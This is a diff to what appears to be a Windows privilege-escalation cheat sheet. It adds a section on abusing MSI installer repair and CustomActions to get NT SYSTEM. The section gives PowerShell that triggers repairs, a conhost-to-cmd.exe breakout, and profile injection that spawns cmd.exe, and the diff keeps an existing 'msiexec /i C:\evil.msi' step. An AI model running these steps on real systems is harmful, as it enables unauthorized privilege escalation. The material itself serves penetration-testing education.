@@ -30,7 +30,9 @@
 * [EoP - $PATH Interception](#eop---path-interception)
 * [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
-* [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
+* [EoP - Microsoft Windows Installer](#eop---microsoft-windows-installer)
+    * [AlwaysInstallElevated](#alwaysinstallelevated)
+    * [CustomActions](#customactions)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
 * [EoP - Printers](#eop---printers)
@@ -837,17 +839,22 @@ To cross compile a program from Kali, use the following command.
 Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 ```
 
-## EoP - AlwaysInstallElevated
+## EoP - Microsoft Windows Installer
 
-Check if these registry values are set to "1".
+### AlwaysInstallElevated
 
-```powershell
-$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Using the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled for both user and machine, indicating the system is vulnerable.
 
-$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
-$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
-```
+* Shell command
+    ```powershell
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    ```
+* PowerShell command
+    ```powershell
+    Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+    Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
+    ```
 
 Then create an MSI package and install it.
 
@@ -860,6 +867,45 @@ $ msiexec /quiet /qn /i C:\evil.msi
 Technique also available in :
 * Metasploit : `exploit/windows/local/always_install_elevated`
 * PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
+
+### CustomActions
+
+> Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation
+
+* [mgeeky/msidump](https://github.com/mgeeky/msidump) - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner.
+* [activescott/lessmsi](https://github.com/activescott/lessmsi) - A tool to view and extract the contents of an Windows Installer (.msi) file.
+* [mandiant/msi-search](https://github.com/mandiant/msi-search) - This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.
+
+Enumerate products on the machine
+
+```ps1
+wmic product get identifyingnumber,name,vendor,version
+```
+
+Execute the repair process with the `/fa` parameter to trigger the CustomActions. 
+We can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}` or path to the installer `c:\windows\installer\XXXXXXX.msi`.
+The repair will run with the NT SYSTEM account.
+
+```ps1
+$installed = Get-WmiObject Win32_Product
+$string= $installed | select-string -pattern "PRODUCTNAME"
+$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
+Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
+```
+
+Common mistakes in MSI installers:
+
+* Missing quiet parameters: it will spawn `conhost.exe` as `NT SYSTEM`. Use `[CTRL]+[A]` to select some text in it, it will pause the execution.
+    * conhost -> properties -> "legacy console mode" Link -> Internet Explorer -> CTRL+O –> cmd.exe
+* GUI with direct actions: Ooa URL and start the browser then use the same scenario.
+* Binaries/Scripts loaded from user writable paths: you might need to win the race condition.
+* DLL hijacking/search order abusing
+* PowerShell `-NoProfile` missing: Add custom commands into your profile
+    ```ps1
+    new-item -Path $PROFILE -Type file -Force
+    echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
+    ```
 
 
 ## EoP - Insecure GUI apps
@@ -1445,3 +1491,6 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
 * [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ ](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
 * [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
+* [MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe](https://badoption.eu/blog/2023/10/03/MSIFortune.html)
+* [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)
+* [Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)
